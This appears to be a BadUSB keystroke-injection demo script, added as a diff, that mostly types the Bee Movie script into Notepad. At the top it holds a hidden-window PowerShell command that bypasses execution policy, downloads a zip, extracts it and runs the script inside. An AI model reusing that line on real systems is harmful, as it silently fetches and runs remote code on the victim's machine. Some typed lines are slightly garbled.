@@ -1,0 +1,2753 @@
+REM This is BadUSB demo script for windows
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://www.youtube.com/watch?v=dQw4w9WgXcQ' -O "$D\rr.zip";Expand-Archive "$D\rr.zip" -Des $D\rr -Force;. "$D\rr\rr.ps1"
+ENTER
+
+REM Open windows notepad
+DELAY 1000
+GUI r
+DELAY 500
+STRING notepad
+DELAY 500
+ENTER
+DELAY 750
+
+REM Alt code input demo
+ALTCHAR 7
+
+STRING =
+REPEAT 59
+ENTER
+STRING According to all known laws of aviation, there is no way a bee should be able to fly.
+ENTER
+STRING Its wings are too small to get its fat little body off the ground.
+ENTER
+STRING The bee, of course, flies anyway because bees don't care what humans think is impossible.
+ENTER
+STRING Yellow, black. Yellow, black. Yellow, black. Yellow, black.
+ENTER
+STRING Ooh, black and yellow!
+ENTER
+STRING Let's shake it up a little.
+ENTER
+STRING Barry! Breakfast is ready!
+ENTER
+STRING Coming!
+ENTER
+STRING Hang on a second.
+ENTER
+STRING Hello?
+ENTER
+STRING Barry?
+ENTER
+STRING Adam?
+ENTER
+STRING Can you believe this is happening?
+ENTER
+STRING STRING I can't.
+ENTER
+STRING I'll pick you up.
+ENTER
+STRING Looking sharp.
+ENTER
+STRING Use the stairs, Your father paid good money for those.
+ENTER
+STRING Sorry. I'm excited.
+ENTER
+STRING Here's the graduate.
+ENTER
+STRING We're very proud of you, son.
+ENTER
+STRING A perfect report card, all B's.
+ENTER
+STRING Very proud.
+ENTER
+STRING Ma! I got a thing going here.
+ENTER
+STRING You got lint on your fuzz.
+ENTER
+STRING Ow! That's me!
+ENTER
+STRING Wave to us! We'll be in row 118,000.
+ENTER
+STRING ENTER
+ENTER
+STRING STRING Bye!
+ENTER
+STRING Barry, I told you, stop flying in the house!
+ENTER
+STRING Hey, Adam.
+ENTER
+STRING Hey, Barry.
+ENTER
+STRING Is that fuzz gel?
+ENTER
+STRING A little. Special day, graduation.
+ENTER
+STRING Never thought I'd make it.
+ENTER
+STRING Three days grade school, three days high school.
+ENTER
+STRING Those were awkward.
+ENTER
+STRING Three days college. I'm glad I took a day and hitchhiked around The Hive.
+ENTER
+STRING You did come back different.
+ENTER
+STRING Hi, Barry. Artie, growing a mustache? Looks good.
+ENTER
+STRING Hear about Frankie?
+ENTER
+STRING Yeah.
+ENTER
+STRING You going to the funeral?
+ENTER
+STRING No, I'm not going.
+ENTER
+STRING Everybody knows, sting someone, you die.
+ENTER
+STRING Don't waste it on a squirrel.
+ENTER
+STRING Such a hothead.
+ENTER
+STRING I guess he could have just gotten out of the way.
+ENTER
+STRING I love this incorporating an amusement park into our day.
+ENTER
+STRING That's why we don't need vacations.
+ENTER
+STRING Boy, quite a bit of pomp under the circumstances.
+ENTER
+STRING Well, Adam, today we are men.
+ENTER
+STRING We are!
+ENTER
+STRING Bee-men.
+ENTER
+STRING Amen!
+ENTER
+STRING Hallelujah!
+ENTER
+STRING Students, faculty, distinguished bees,
+ENTER
+STRING please welcome Dean Buzzwell.
+ENTER
+STRING Welcome, New Hive City graduating class of 9:15.
+ENTER
+STRING That concludes our ceremonies And begins your career at Honex Industries!
+ENTER
+STRING Will we pick our job today?
+ENTER
+STRING I heard it's just orientation.
+ENTER
+STRING Heads up! Here we go.
+ENTER
+STRING Keep your hands and antennas inside the tram at all times.
+ENTER
+STRING Wonder what it'll be like?
+ENTER
+STRING A little scary.
+ENTER
+STRING Welcome to Honex, a division of Honesco and a part of the Hexagon Group.
+ENTER
+STRING This is it!
+ENTER
+STRING Wow.
+ENTER
+STRING Wow.
+ENTER
+STRING We know that you, as a bee, have worked your whole life to get to the point where you can work for your whole life.
+ENTER
+STRING Honey begins when our valiant Pollen Jocks bring the nectar to The Hive.
+ENTER
+STRING Our top-secret formula is automatically color-corrected, scent-adjusted and bubble-contoured into this soothing sweet syrup with its distinctive golden glow you know as... Honey!
+ENTER
+STRING That girl was hot.
+ENTER
+STRING She's my cousin!
+ENTER
+STRING She is?
+ENTER
+STRING Yes, we're all cousins.
+ENTER
+STRING Right. You're right.
+ENTER
+STRING At Honex, we constantly strive to improve every aspect of bee existence.
+ENTER
+STRING These bees are stress-testing a new helmet technology.
+ENTER
+STRING What do you think he makes?
+ENTER
+STRING Not enough.
+ENTER
+STRING Here we have our latest advancement, the Krelman.
+ENTER
+STRING What does that do?
+ENTER
+STRING Catches that little strand of honey that hangs after you pour it.
+ENTER
+STRING Saves us millions.
+ENTER
+STRING Can anyone work on the Krelman?
+ENTER
+STRING Of course. Most bee jobs are small ones.
+ENTER
+STRING But bees know that every small job, if it's done well, means a lot.
+ENTER
+STRING But choose carefully because you'll stay in the job you pick for the rest of your life.
+ENTER
+STRING The same job the rest of your life? I didn't know that.
+ENTER
+STRING What's the difference?
+ENTER
+STRING You'll be happy to know that bees, as a species, haven't had one day off in 27 million years.
+ENTER
+STRING So you'll just work us to death?
+ENTER
+STRING We'll sure try.
+ENTER
+STRING Wow! That blew my mind!
+ENTER
+STRING "What's the difference?"
+ENTER
+STRING How can you say that?
+ENTER
+STRING One job forever?
+ENTER
+STRING That's an insane choice to have to make.
+ENTER
+STRING I'm relieved. Now we only have to make one decision in life.
+ENTER
+STRING But, Adam, how could they never have told us that?
+ENTER
+STRING Why would you question anything? We're bees.
+ENTER
+STRING We're the most perfectly functioning society on Earth.
+ENTER
+STRING You ever think maybe things work a little too well here?
+ENTER
+STRING Like what? Give me one example.
+ENTER
+STRING I don't know. But you know what I'm talking about.
+ENTER
+STRING Please clear the gate. Royal Nectar Force on approach.
+ENTER
+STRING Wait a second. Check it out.
+ENTER
+STRING Hey, those are Pollen Jocks!
+ENTER
+STRING Wow.
+ENTER
+STRING I've never seen them this close.
+ENTER
+STRING They know what it's like outside The Hive.
+ENTER
+STRING Yeah, but some don't come back.
+ENTER
+STRING Hey, Jocks!
+ENTER
+STRING Hi, Jocks!
+ENTER
+STRING You guys did great!
+ENTER
+STRING You're monsters!
+ENTER
+STRING You're sky freaks! I love it! I love it!
+ENTER
+STRING I wonder where they were.
+ENTER
+STRING I don't know.
+ENTER
+STRING Their day's not planned.
+ENTER
+STRING Outside The Hive, flying who knows where, doing who knows what.
+ENTER
+STRING You can't just decide to be a Pollen Jock. You have to be bred for that.
+ENTER
+STRING Right.
+ENTER
+STRING Look. That's more pollen than you and I will see in a lifetime.
+ENTER
+STRING It's just a status symbol.
+ENTER
+STRING Bees make too much of it.
+ENTER
+STRING Perhaps. Unless you're wearing it and the ladies see you wearing it.
+ENTER
+STRING Those ladies?
+ENTER
+STRING Aren't they our cousins too?
+ENTER
+STRING Distant. Distant.
+ENTER
+STRING Look at these two.
+ENTER
+STRING Couple of Hive Harrys.
+ENTER
+STRING Let's have fun with them.
+ENTER
+STRING It must be dangerous being a Pollen Jock.
+ENTER
+STRING Yeah. Once a bear pinned me against a mushroom!
+ENTER
+STRING He had a paw on my throat, and with the other, he was slapping me!
+ENTER
+STRING Oh, my!
+ENTER
+STRING I never thought I'd knock him out.
+ENTER
+STRING What were you doing during this?
+ENTER
+STRING Trying to alert the authorities.
+ENTER
+STRING I can autograph that.
+ENTER
+STRING A little gusty out there today, wasn't it, comrades?
+ENTER
+STRING Yeah. Gusty.
+ENTER
+STRING We're hitting a sunflower patch six miles from here tomorrow.
+ENTER
+STRING Six miles, huh?
+ENTER
+STRING Barry!
+ENTER
+STRING A puddle jump for us, but maybe you're not up for it.
+ENTER
+STRING Maybe I am.
+ENTER
+STRING You are not!
+ENTER
+STRING We're going 0900 at J-Gate.
+ENTER
+STRING What do you think, buzzy-boy?
+ENTER
+STRING Are you bee enough?
+ENTER
+STRING I might be. It all depends on what 0900 means.
+ENTER
+STRING Hey, Honex!
+ENTER
+STRING Dad, you surprised me.
+ENTER
+STRING You decide what you're interested in?
+ENTER
+STRING Well, there's a lot of choices.
+ENTER
+STRING But you only get one.
+ENTER
+STRING Do you ever get bored doing the same job every day?
+ENTER
+STRING Son, let me tell you about stirring.
+ENTER
+STRING You grab that stick, and you just move it around, and you stir it around.
+ENTER
+STRING You get yourself into a rhythm.
+ENTER
+STRING It's a beautiful thing.
+ENTER
+STRING You know, Dad, the more I think about it,
+ENTER
+STRING maybe the honey field just isn't right for me.
+ENTER
+STRING You were thinking of what, making balloon animals?
+ENTER
+STRING That's a bad job for a guy with a stinger.
+ENTER
+STRING Janet, your son's not sure he wants to go into honey!
+ENTER
+STRING Barry, you are so funny sometimes.
+ENTER
+STRING I'm not trying to be funny.
+ENTER
+STRING You're not funny! You're going into honey. Our son, the stirrer!
+ENTER
+STRING You're gonna be a stirrer?
+ENTER
+STRING No one's listening to me!
+ENTER
+STRING Wait till you see the sticks I have.
+ENTER
+STRING I could say anything right now.
+ENTER
+STRING I'm gonna get an ant tattoo!
+ENTER
+STRING Let's open some honey and celebrate!
+ENTER
+STRING Maybe I'll pierce my thorax. Shave my antennae. Shack up with a grasshopper. Get a gold tooth and call everybody "dawg"!
+ENTER
+STRING I'm so proud.
+ENTER
+STRING We're starting work today!
+ENTER
+STRING Today's the day.
+ENTER
+STRING Come on! All the good jobs will be gone.
+ENTER
+STRING Yeah, right.
+ENTER
+STRING Pollen counting, stunt bee, pouring, stirrer, front desk, hair removal...
+ENTER
+STRING Is it still available?
+ENTER
+STRING Hang on. Two left!
+ENTER
+STRING One of them's yours! Congratulations!
+ENTER
+STRING Step to the side.
+ENTER
+STRING What'd you get?
+ENTER
+STRING Picking crud out. Stellar!
+ENTER
+STRING Wow!
+ENTER
+STRING Couple of newbies?
+ENTER
+STRING Yes, sir! Our first day! We are ready!
+ENTER
+STRING Make your choice.
+ENTER
+STRING You want to go first?
+ENTER
+STRING No, you go.
+ENTER
+STRING Oh, my. What's available?
+ENTER
+STRING Restroom attendant's open, not for the reason you think.
+ENTER
+STRING Any chance of getting the Krelman?
+ENTER
+STRING Sure, you're on.
+ENTER
+STRING I'm sorry, the Krelman just closed out.
+ENTER
+STRING Wax monkey's always open.
+ENTER
+STRING The Krelman opened up again.
+ENTER
+STRING What happened?
+ENTER
+STRING A bee died. Makes an opening. See? He's dead. Another dead one.
+ENTER
+STRING Deady. Deadified. Two more dead.
+ENTER
+STRING Dead from the neck up. Dead from the neck down. That's life!
+ENTER
+STRING Oh, this is so hard!
+ENTER
+STRING Heating, cooling, stunt bee, pourer, stirrer, humming, inspector number seven, lint coordinator, stripe supervisor, mite wrangler.
+ENTER
+STRING Barry, what do you think I should... Barry?
+ENTER
+STRING Barry!
+ENTER
+STRING All right, we've got the sunflower patch in quadrant nine...
+ENTER
+STRING What happened to you?
+ENTER
+STRING Where are you?
+ENTER
+STRING I'm going out.
+ENTER
+STRING Out? Out where?
+ENTER
+STRING Out there.
+ENTER
+STRING Oh, no!
+ENTER
+STRING I have to, before I go to work for the rest of my life.
+ENTER
+STRING You're gonna die! You're crazy! Hello?
+ENTER
+STRING Another call coming in.
+ENTER
+STRING If anyone's feeling brave, there's a Korean deli on 83rd that gets their roses today.
+ENTER
+STRING Hey, guys.
+ENTER
+STRING Look at that.
+ENTER
+STRING Isn't that the kid we saw yesterday?
+ENTER
+STRING Hold it, son, flight deck's restricted.
+ENTER
+STRING It's OK, Lou. We're gonna take him up.
+ENTER
+STRING Really? Feeling lucky, are you?
+ENTER
+STRING Sign here, here. Just initial that.
+ENTER
+STRING Thank you.
+ENTER
+STRING OK.
+ENTER
+STRING You got a rain advisory today, and as you all know, bees cannot fly in rain.
+ENTER
+STRING So be careful. As always, watch your brooms, hockey sticks, dogs, birds, bears and bats.
+ENTER
+STRING Also, I got a couple of reports of root beer being poured on us.
+ENTER
+STRING Murphy's in a home because of it, babbling like a cicada!
+ENTER
+STRING That's awful.
+ENTER
+STRING And a reminder for you rookies, bee law number one, absolutely no talking to humans!
+ENTER
+STRING  All right, launch positions!
+ENTER
+STRING Buzz, buzz, buzz, buzz! Buzz, buzz, buzz, buzz! Buzz, buzz, buzz, buzz!
+ENTER
+STRING Black and yellow!
+ENTER
+STRING Hello!
+ENTER
+STRING You ready for this, hot shot?
+ENTER
+STRING Yeah. Yeah, bring it on.
+ENTER
+STRING Wind, check.
+ENTER
+STRING Antennae, check.
+ENTER
+STRING Nectar pack, check.
+ENTER
+STRING Wings, check.
+ENTER
+STRING Stinger, check.
+ENTER
+STRING Scared out of my shorts, check.
+ENTER
+STRING OK, ladies,
+ENTER
+STRING let's move it out!
+ENTER
+STRING Pound those petunias, you striped stem-suckers!
+ENTER
+STRING All of you, drain those flowers!
+ENTER
+STRING Wow! I'm out!
+ENTER
+STRING I can't believe I'm out!
+ENTER
+STRING So blue.
+ENTER
+STRING I feel so fast and free!
+ENTER
+STRING Box kite!
+ENTER
+STRING Wow!
+ENTER
+STRING Flowers!
+ENTER
+STRING This is Blue Leader, We have roses visual.
+ENTER
+STRING Bring it around 30 degrees and hold.
+ENTER
+STRING Roses!
+ENTER
+STRING 30 degrees, roger. Bringing it around.
+ENTER
+STRING Stand to the side, kid.
+ENTER
+STRING It's got a bit of a kick.
+ENTER
+STRING That is one nectar collector!
+ENTER
+STRING Ever see pollination up close?
+ENTER
+STRING No, sir.
+ENTER
+STRING I pick up some pollen here, sprinkle it over here. Maybe a dash over there, a pinch on that one.
+ENTER
+STRING See that? It's a little bit of magic.
+ENTER
+STRING That's amazing. Why do we do that?
+ENTER
+STRING That's pollen power. More pollen, more flowers, more nectar, more honey for us.
+ENTER
+STRING Cool.
+ENTER
+STRING I'm picking up a lot of bright yellow, Could be daisies, Don't we need those?
+ENTER
+STRING Copy that visual.
+ENTER
+STRING Wait. One of these flowers seems to be on the move.
+ENTER
+STRING Say again? You're reporting a moving flower?
+ENTER
+STRING Affirmative.
+ENTER
+STRING That was on the line!
+ENTER
+STRING This is the coolest. What is it?
+ENTER
+STRING I don't know, but I'm loving this color.
+ENTER
+STRING It smells good.
+ENTER
+STRING Not like a flower, but I like it.
+ENTER
+STRING Yeah, fuzzy.
+ENTER
+STRING Chemical-y.
+ENTER
+STRING Careful, guys. It's a little grabby.
+ENTER
+STRING My sweet lord of bees!
+ENTER
+STRING Candy-brain, get off there!
+ENTER
+STRING Problem!
+ENTER
+STRING Guys!
+ENTER
+STRING This could be bad.
+ENTER
+STRING Affirmative.
+ENTER
+STRING Very close.
+ENTER
+STRING Gonna hurt.
+ENTER
+STRING Mama's little boy.
+ENTER
+STRING You are way out of position, rookie!
+ENTER
+STRING Coming in at you like a missile!
+ENTER
+STRING Help me!
+ENTER
+STRING I don't think these are flowers.
+ENTER
+STRING Should we tell him?
+ENTER
+STRING I think he knows.
+ENTER
+STRING What is this?!
+ENTER
+STRING Match point!
+ENTER
+STRING You can start packing up, honey, because you're about to eat it!
+ENTER
+STRING Yowser!
+ENTER
+STRING Gross.
+ENTER
+STRING There's a bee in the car!
+ENTER
+STRING Do something!
+ENTER
+STRING I'm driving!
+ENTER
+STRING Hi, bee.
+ENTER
+STRING He's back here!
+ENTER
+STRING He's going to sting me!
+ENTER
+STRING Nobody move. If you don't move, he won't sting you. Freeze!
+ENTER
+STRING He blinked!
+ENTER
+STRING Spray him, Granny!
+ENTER
+STRING What are you doing?!
+ENTER
+STRING Wow... the tension level out here is unbelievable.
+ENTER
+STRING I gotta get home.
+ENTER
+STRING Can't fly in rain. Can't fly in rain. Can't fly in rain.
+ENTER
+STRING Mayday! Mayday! Bee going down!
+ENTER
+STRING Ken, could you close the window please?
+ENTER
+STRING Ken, could you close the window please?
+ENTER
+STRING Check out my new resume. I made it into a fold-out brochure. You see? Folds out.
+ENTER
+STRING Oh, no. More humans. I don't need this.
+ENTER
+STRING What was that?
+ENTER
+STRING Maybe this time. This time. This time. This time! This time! This... Drapes!
+ENTER
+STRING That is diabolical.
+ENTER
+STRING It's fantastic. It's got all my special skills, even my top-ten favorite movies.
+ENTER
+STRING What's number one? Star Wars?
+ENTER
+STRING Nah, I don't go for that... kind of stuff.
+ENTER
+STRING No wonder we shouldn't talk to them. They're out of their minds.
+ENTER
+STRING When I leave a job interview, they're flabbergasted, can't believe what I say.
+ENTER
+STRING There's the sun. Maybe that's a way out.
+ENTER
+STRING I don't remember the sun having a big 75 on it.
+ENTER
+STRING I predicted global warming. I could feel it getting hotter. At first I thought it was just me.
+ENTER
+STRING Wait! Stop! Bee!
+ENTER
+STRING Stand back. These are winter boots.
+ENTER
+STRING Wait!
+ENTER
+STRING Don't kill him!
+ENTER
+STRING You know I'm allergic to them! This thing could kill me!
+ENTER
+STRING Why does his life have less value than yours?
+ENTER
+STRING Why does his life have any less value than mine? Is that your statement?
+ENTER
+STRING I'm just saying all life has value. You don't know what he's capable of feeling.
+ENTER
+STRING My brochure!
+ENTER
+STRING There you go, little guy.
+ENTER
+STRING I'm not scared of him.It's an allergic thing.
+ENTER
+STRING  Put that on your resume brochure.
+ENTER
+STRING My whole face could puff up.
+ENTER
+STRING Make it one of your special skills.
+ENTER
+STRING Knocking someone out is also a special skill.
+ENTER
+STRING Right. Bye, Vanessa. Thanks.
+ENTER
+STRING Vanessa, next week? Yogurt night?
+ENTER
+STRING Sure, Ken. You know, whatever.
+ENTER
+STRING You could put carob chips on there.
+ENTER
+STRING Bye.
+ENTER
+STRING Supposed to be less calories.
+ENTER
+STRING Bye.
+ENTER
+STRING I gotta say something. She saved my life. I gotta say something.
+ENTER
+STRING All right, here it goes.
+ENTER
+STRING Nah.
+ENTER
+STRING What would I say?
+ENTER
+STRING I could really get in trouble. It's a bee law. You're not supposed to talk to a human.
+ENTER
+STRING I can't believe I'm doing this. I've got to.
+ENTER
+STRING Oh, I can't do it. Come on!
+ENTER
+STRING No. Yes. No. Do it. I can't.
+ENTER
+STRING How should I start it? "You like jazz?" No, that's no good.
+ENTER
+STRING Here she comes! Speak, you fool!
+ENTER
+STRING Hi!
+ENTER
+STRING I'm sorry. You're talking.
+ENTER
+STRING Yes, I know.
+ENTER
+STRING You're talking!
+ENTER
+STRING I'm so sorry.
+ENTER
+STRING No, it's OK. It's fine.
+ENTER
+STRING I know I'm dreaming. But I don't recall going to bed.
+ENTER
+STRING Well, I'm sure this is very disconcerting.
+ENTER
+STRING This is a bit of a surprise to me. I mean, you're a bee!
+ENTER
+STRING I am. And I'm not supposed to be doing this, but they were all trying to kill me.
+ENTER
+STRING And if it wasn't for you... I had to thank you. It's just how I was raised.
+ENTER
+STRING That was a little weird. I'm talking with a bee.
+ENTER
+STRING Yeah.
+ENTER
+STRING I'm talking to a bee. And the bee is talking to me!
+ENTER
+STRING I just want to say I'm grateful.
+ENTER
+STRING I'll leave now.
+ENTER
+STRING Wait! How did you learn to do that?
+ENTER
+STRING What?
+ENTER
+STRING The talking thing.
+ENTER
+STRING Same way you did, I guess. "Mama, Dada, honey." You pick it up.
+ENTER
+STRING That's very funny.
+ENTER
+STRING Yeah.
+ENTER
+STRING Bees are funny. If we didn't laugh, we'd cry with what we have to deal with.
+ENTER
+STRING Anyway... Can I... get you something?
+ENTER
+STRING Like what?
+ENTER
+STRING I don't know. I mean... I don't know. Coffee?
+ENTER
+STRING I don't want to put you out.
+ENTER
+STRING It's no trouble. It takes two minutes.
+ENTER
+STRING It's just coffee.
+ENTER
+STRING I hate to impose.
+ENTER
+STRING Don't be ridiculous!
+ENTER
+STRING Actually, I would love a cup.
+ENTER
+STRING Hey, you want rum cake?
+ENTER
+STRING I shouldn't.
+ENTER
+STRING Have some.
+ENTER
+STRING No, I can't.
+ENTER
+STRING Come on!
+ENTER
+STRING I'm trying to lose a couple micrograms.
+ENTER
+STRING Where?
+ENTER
+STRING These stripes don't help.
+ENTER
+STRING You look great!
+ENTER
+STRING I don't know if you know anything about fashion.
+ENTER
+STRING Are you all right?
+ENTER
+STRING No.
+ENTER
+STRING He's making the tie in the cab as they're flying up Madison.
+ENTER
+STRING He finally gets there.
+ENTER
+STRING He runs up the steps into the church.
+ENTER
+STRING The wedding is on.
+ENTER
+STRING And he says, "Watermelon?
+ENTER
+STRING I thought you said Guatemalan.
+ENTER
+STRING Why would I marry a watermelon?"
+ENTER
+STRING Is that a bee joke?
+ENTER
+STRING That's the kind of stuff we do.
+ENTER
+STRING Yeah, different.
+ENTER
+STRING So, what are you gonna do, Barry?
+ENTER
+STRING About work? I don't know.
+ENTER
+STRING I want to do my part for The Hive, but I can't do it the way they want.
+ENTER
+STRING I know how you feel.
+ENTER
+STRING You do?
+ENTER
+STRING Sure.
+ENTER
+STRING My parents wanted me to be a lawyer or a doctor, but I wanted to be a florist.
+ENTER
+STRING Really?
+ENTER
+STRING My only interest is flowers.
+ENTER
+STRING Our new queen was just elected with that same campaign slogan.
+ENTER
+STRING Anyway, if you look... There's my hive right there. See it?
+ENTER
+STRING You're in Sheep Meadow!
+ENTER
+STRING Yes! I'm right off the Turtle Pond!
+ENTER
+STRING No way! I know that area. I lost a toe ring there once.
+ENTER
+STRING Why do girls put rings on their toes?
+ENTER
+STRING Why not?
+ENTER
+STRING It's like putting a hat on your knee.
+ENTER
+STRING Maybe I'll try that.
+ENTER
+STRING You all right, ma'am?
+ENTER
+STRING Oh, yeah. Fine.
+ENTER
+STRING Just having two cups of coffee!
+ENTER
+STRING Anyway, this has been great.
+ENTER
+STRING Thanks for the coffee.
+ENTER
+STRING Yeah, it's no trouble.
+ENTER
+STRING Sorry I couldn't finish it. If I did, I'd be up the rest of my life.
+ENTER
+STRING Are you...?
+ENTER
+STRING Can I take a piece of this with me?
+ENTER
+STRING Sure! Here, have a crumb.
+ENTER
+STRING Thanks!
+ENTER
+STRING Yeah.
+ENTER
+STRING All right. Well, then... I guess I'll see you around. Or not.
+ENTER
+STRING OK, Barry.
+ENTER
+STRING And thank you so much again... for before.
+ENTER
+STRING Oh, that? That was nothing.
+ENTER
+STRING Well, not nothing, but... Anyway...
+ENTER
+STRING This can't possibly work.
+ENTER
+STRING He's all set to go.
+ENTER
+STRING We may as well try it.
+ENTER
+STRING OK, Dave, pull the chute.
+ENTER
+STRING Sounds amazing.
+ENTER
+STRING It was amazing!
+ENTER
+STRING It was the scariest, happiest moment of my life.
+ENTER
+STRING Humans! I can't believe you were with humans!
+ENTER
+STRING Giant, scary humans!
+ENTER
+STRING What were they like?
+ENTER
+STRING Huge and crazy. They talk crazy.
+ENTER
+STRING They eat crazy giant things.
+ENTER
+STRING They drive crazy.
+ENTER
+STRING Do they try and kill you, like on TV?
+ENTER
+STRING Some of them. But some of them don't.
+ENTER
+STRING How'd you get back?
+ENTER
+STRING Poodle.
+ENTER
+STRING You did it, and I'm glad. You saw whatever you wanted to see.
+ENTER
+STRING You had your "experience." Now you can pick out yourjob and be normal.
+ENTER
+STRING Well...
+ENTER
+STRING Well?
+ENTER
+STRING Well, I met someone.
+ENTER
+STRING You did? Was she Bee-ish?
+ENTER
+STRING A wasp?! Your parents will kill you!
+ENTER
+STRING No, no, no, not a wasp.
+ENTER
+STRING Spider?
+ENTER
+STRING I'm not attracted to spiders.
+ENTER
+STRING I know it's the hottest thing, with the eight legs and all. I can't get by that face.
+ENTER
+STRING So who is she?
+ENTER
+STRING She's... human.
+ENTER
+STRING No, no. That's a bee law. You wouldn't break a bee law.
+ENTER
+STRING Her name's Vanessa.
+ENTER
+STRING Oh, boy.
+ENTER
+STRING She's so nice. And she's a florist!
+ENTER
+STRING Oh, no! You're dating a human florist!
+ENTER
+STRING We're not dating.
+ENTER
+STRING You're flying outside The Hive, talking to humans that attack our homes with power washers and M-80s! One-eighth a stick of dynamite!
+ENTER
+STRING She saved my life! And she understands me.
+ENTER
+STRING This is over!
+ENTER
+STRING Eat this.
+ENTER
+STRING This is not over! What was that?
+ENTER
+STRING They call it a crumb.
+ENTER
+STRING It was so stingin' stripey!
+ENTER
+STRING And that's not what they eat.
+ENTER
+STRING That's what falls off what they eat!
+ENTER
+STRING You know what a Cinnabon is?
+ENTER
+STRING No.
+ENTER
+STRING It's bread and cinnamon and frosting. They heat it up...
+ENTER
+STRING Sit down!
+ENTER
+STRING ...really hot!
+ENTER
+STRING Listen to me!
+ENTER
+STRING We are not them! We're us.
+ENTER
+STRING There's us and there's them!
+ENTER
+STRING Yes, but who can deny the heart that is yearning?
+ENTER
+STRING There's no yearning. Stop yearning. Listen to me!
+ENTER
+STRING You have got to start thinking bee, my friend. Thinking bee!
+ENTER
+STRING Thinking bee.
+ENTER
+STRING Thinking bee.
+ENTER
+STRING Thinking bee! Thinking bee! Thinking bee! Thinking bee!
+ENTER
+STRING There he is. He's in the pool.
+ENTER
+STRING You know what your problem is, Barry?
+ENTER
+STRING I gotta start thinking bee?
+ENTER
+STRING How much longer will this go on?
+ENTER
+STRING It's been three days! Why aren't you working?
+ENTER
+STRING I've got a lot of big life decisions to think about.
+ENTER
+STRING What life? You have no life!
+ENTER
+STRING You have no job. You're barely a bee!
+ENTER
+STRING Would it kill you to make a little honey?
+ENTER
+STRING Barry, come out. Your father's talking to you.
+ENTER
+STRING Martin, would you talk to him?
+ENTER
+STRING Barry, I'm talking to you!
+ENTER
+STRING You coming?
+ENTER
+STRING Got everything?
+ENTER
+STRING All set!
+ENTER
+STRING Go ahead. I'll catch up.
+ENTER
+STRING Don't be too long.
+ENTER
+STRING Watch this!
+ENTER
+STRING Vanessa!
+ENTER
+STRING We're still here.
+ENTER
+STRING I told you not to yell at him.
+ENTER
+STRING He doesn't respond to yelling!
+ENTER
+STRING Then why yell at me?
+ENTER
+STRING Because you don't listen!
+ENTER
+STRING I'm not listening to this.
+ENTER
+STRING Sorry, I've gotta go.
+ENTER
+STRING Where are you going?
+ENTER
+STRING I'm meeting a friend.
+ENTER
+STRING A girl? Is this why you can't decide?
+ENTER
+STRING Bye.
+ENTER
+STRING I just hope she's Bee-ish.
+ENTER
+STRING They have a huge parade of flowers every year in Pasadena?
+ENTER
+STRING To be in the Tournament of Roses, that's every florist's dream!
+ENTER
+STRING Up on a float, surrounded by flowers, crowds cheering.
+ENTER
+STRING A tournament. Do the roses compete in athletic events?
+ENTER
+STRING No. All right, I've got one.
+ENTER
+STRING How come you don't fly everywhere?
+ENTER
+STRING It's exhausting. Why don't you run everywhere? It's faster.
+ENTER
+STRING Yeah, OK, I see, I see.
+ENTER
+STRING All right, your turn.
+ENTER
+STRING TiVo. You can just freeze live TV? That's insane!
+ENTER
+STRING You don't have that?
+ENTER
+STRING We have Hivo, but it's a disease. It's a horrible, horrible disease.
+ENTER
+STRING Oh, my.
+ENTER
+STRING Dumb bees!
+ENTER
+STRING You must want to sting all those jerks.
+ENTER
+STRING We try not to sting. It's usually fatal for us.
+ENTER
+STRING So you have to watch your temper.
+ENTER
+STRING Very carefully.
+ENTER
+STRING You kick a wall, take a walk, write an angry letter and throw it out. Work through it like any emotion: Anger, jealousy, lust.
+ENTER
+STRING Oh, my goodness! Are you OK?
+ENTER
+STRING Yeah.
+ENTER
+STRING What is wrong with you?!
+ENTER
+STRING It's a bug.
+ENTER
+STRING He's not bothering anybody.
+ENTER
+STRING Get out of here, you creep!
+ENTER
+STRING What was that? A Pic 'N' Save circular?
+ENTER
+STRING Yeah, it was. How did you know?
+ENTER
+STRING It felt like about 10 pages. Seventy-five is pretty much our limit.
+ENTER
+STRING You've really got that down to a science.
+ENTER
+STRING I lost a cousin to Italian Vogue.
+ENTER
+STRING I'll bet.
+ENTER
+STRING What in the name of Mighty Hercules is this?
+ENTER
+STRING How did this get here? cute Bee, Golden Blossom, Ray Liotta Private Select?
+ENTER
+STRING Is he that actor?
+ENTER
+STRING I never heard of him.
+ENTER
+STRING Why is this here?
+ENTER
+STRING For people. We eat it.
+ENTER
+STRING You don't have enough food of your own?
+ENTER
+STRING Well, yes.
+ENTER
+STRING How do you get it?
+ENTER
+STRING Bees make it.
+ENTER
+STRING I know who makes it! And it's hard to make it!
+ENTER
+STRING There's heating, cooling, stirring. You need a whole Krelman thing!
+ENTER
+STRING It's organic.
+ENTER
+STRING It's our-ganic!
+ENTER
+STRING It's just honey, Barry.
+ENTER
+STRING Just what?!
+ENTER
+STRING Bees don't know about this! This is stealing! A lot of stealing!
+ENTER
+STRING You've taken our homes, schools,hospitals! This is all we have!
+ENTER
+STRING And it's on sale?! I'm getting to the bottom of this.
+ENTER
+STRING I'm getting to the bottom of all of this!
+ENTER
+STRING Hey, Hector. You almost done?
+ENTER
+STRING Almost.
+ENTER
+STRING He is here. I sense it.
+ENTER
+STRING Well, I guess I'll go home now and just leave this nice honey out, with no one around.
+ENTER
+STRING You're busted, box boy!
+ENTER
+STRING I knew I heard something.
+ENTER
+STRING So you can talk!
+ENTER
+STRING I can talk. And now you'll start talking!
+ENTER
+STRING Where you getting the sweet stuff? Who's your supplier?
+ENTER
+STRING I don't understand.
+ENTER
+STRING I thought we were friends.
+ENTER
+STRING The last thing we want to do is upset bees!
+ENTER
+STRING You're too late! It's ours now!
+ENTER
+STRING You, sir, have crossed the wrong sword!
+ENTER
+STRING You, sir, will be lunch for my iguana, Ignacio!
+ENTER
+STRING Where is the honey coming from? Tell me where!
+ENTER
+STRING Honey Farms! It comes from Honey Farms!
+ENTER
+STRING Crazy person!
+ENTER
+STRING What horrible thing has happened here?
+ENTER
+STRING These faces, they never knew what hit them. And now
+ENTER
+STRING they're on the road to nowhere!
+ENTER
+STRING Just keep still.
+ENTER
+STRING What? You're not dead?
+ENTER
+STRING Do I look dead? They will wipe anything that moves. Where you headed?
+ENTER
+STRING To Honey Farms. I am onto something huge here.
+ENTER
+STRING I'm going to Alaska. Moose blood, crazy stuff. Blows your head off!
+ENTER
+STRING I'm going to Tacoma.
+ENTER
+STRING And you?
+ENTER
+STRING He really is dead.
+ENTER
+STRING All right.
+ENTER
+STRING Uh-oh!
+ENTER
+STRING What is that?!
+ENTER
+STRING Oh, no!
+ENTER
+STRING A wiper! Triple blade!
+ENTER
